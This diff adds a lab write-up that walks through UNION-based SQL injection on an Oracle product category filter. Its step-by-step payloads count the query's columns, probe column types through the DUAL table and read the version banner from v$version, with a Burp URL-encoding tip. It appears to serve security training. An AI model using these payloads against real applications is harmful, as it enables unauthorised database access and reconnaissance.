@@ -1,0 +1,41 @@
+SQL Injection: Query database type and version on Oracle
+Location: Product category filter
+
+End Goal: Display the database version string
+
+ANALYSIS
+--------
+
+We can quickly confirm that the product category field is vulnerable by adding an SQLi character '
+
+1. Determine the number of columns that the vulnerable query is using
+
+' order by 1--  # Response code 200 => Column exists
+' order by 2--  # Response code 200 => Column exists
+' order by 3--  # Internal Server Error => Column doesn't exist
+
+The vulnerable query thus uses 2 columns
+
+2. Determine the column data types
+
+' UNION select 'a', NULL--
+' UNION select NULL, 'a'--
+' UNION select 'a', 'a'--   # You can even test both simultaneously if both are suspected to be of the same data type
+
+Oracle might require you to specify a table before you can check the column data types. 
+In this case you may use the DUAL table which is a default table usually available to all users
+
+' UNION select 'a', 'a' from DUAL--
+
+3. Output the database version
+
+We can use the SQLi cheatsheet to check ways to output various databases versions. For Oracle, the syntax is:
+
+SELECT banner from v$version
+
+We can then formulate our query as below:
+
+' UNION select banner, NULL from v$version--
+
+*** Remember, if testing from Burp, you need to URL-encode your payloads since you are already past the client (browser) which automatically does it for you!
+
